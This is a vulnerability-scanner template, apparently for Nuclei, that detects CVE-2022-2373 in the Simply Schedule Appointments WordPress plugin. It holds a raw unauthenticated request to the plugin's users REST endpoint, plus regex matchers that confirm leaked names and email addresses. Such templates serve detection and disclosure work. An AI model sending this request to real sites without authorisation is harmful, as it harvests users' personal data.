id: CVE-2022-2373

info:
  name: Simply Schedule Appointments < 1.5.7.7 - Unauthenticated Email Address Disclosure
  author: theamanrawat, abhinav, shivam
  severity: medium
  description: |
    The Simply Schedule Appointments WordPress plugin before 1.5.7.7 is missing authorisation in a REST endpoint, allowing unauthenticated users to retrieve WordPress users details such as name and email address.
  reference:
    - https://wpscan.com/vulnerability/6aa9aa0d-b447-4584-a07e-b8a0d1b83a31
    - https://wordpress.org/plugins/simply-schedule-appointments/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-2373
  tags: cve,cve2022,information-disclosure,wpscan,wordpress,wp-plugin,wp,simply-schedule-appointments,unauth

requests:
  - raw:
      - |
        GET /wp-json/ssa/v1/users HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: regex
        regex:
          - '{"response_code":200,'
          - '"email":"([a-zA-Z-_0-9@.]+)","display_name":"([a-zA-Z-_0-9@.]+)","gravatar_url":"http?:\\\/\\\/([a-z0-9A-Z.\\\/?=&@_-]+)"'
        condition: and

      - type: word
        part: header
        words:
          - application/json

      - type: status
        status:
          - 200